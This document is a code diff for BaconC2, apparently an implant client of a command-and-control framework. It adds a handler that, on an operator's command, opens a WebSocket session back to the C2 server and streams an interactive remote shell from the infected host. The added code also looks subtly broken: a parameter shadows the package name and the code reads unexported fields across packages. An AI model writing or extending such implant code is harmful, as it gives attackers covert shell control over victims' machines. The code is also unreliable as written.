@@ -2,6 +2,7 @@ package commands
 
 import (
 	"fmt"
+	"time"
 
 	"github.com/RabbITCybErSeC/BaconC2/client/core/sysinfo"
 	"github.com/RabbITCybErSeC/BaconC2/client/models"
@@ -54,4 +55,50 @@ func getInfoHandler(cmd models.Command, resultsQueue queue.IResultQueue) models.
 	}
 
 	return result
+}
+
+func startShellHandler(cmd models.Command, resultsQueue queue.IResultQueue, transport models.ITransportProtocol) models.CommandResult {
+	shellType := "cmd"
+	if cmd.Args != nil {
+		if val, ok := cmd.Args["shell_type"]; ok {
+			shellType = val
+		}
+	}
+
+	wsTransport := transport.NewWebSocketTransport(transport.(*transport.HTTPTransport).serverURL, transport.(*transport.HTTPTransport).agentID)
+
+	resultChan := make(chan models.CommandResult, 1)
+	go func() {
+		config := models.StreamingConfig{
+			ShellType: shellType,
+		}
+		if err := wsTransport.StartStreamingSession("shell", config, resultChan); err != nil {
+			resultChan <- models.CommandResult{
+				ID:     cmd.ID,
+				Status: "error",
+				Output: map[string]string{"error": fmt.Sprintf("Failed to start shell: %v", err)},
+			}
+		}
+	}()
+
+	select {
+	case result := <-resultChan:
+		if result.Status == "success" {
+			if err := resultsQueue.Add(result); err != nil {
+				return models.CommandResult{
+					ID:     cmd.ID,
+					Status: "error",
+					Output: map[string]string{"error": fmt.Sprintf("Failed to queue result: %v", err)},
+				}
+			}
+		}
+		return result
+	case <-time.After(30 * time.Second):
+		wsTransport.CloseSession("shell")
+		return models.CommandResult{
+			ID:     cmd.ID,
+			Status: "error",
+			Output: map[string]string{"error": "Shell session timeout"},
+		}
+	}
 }
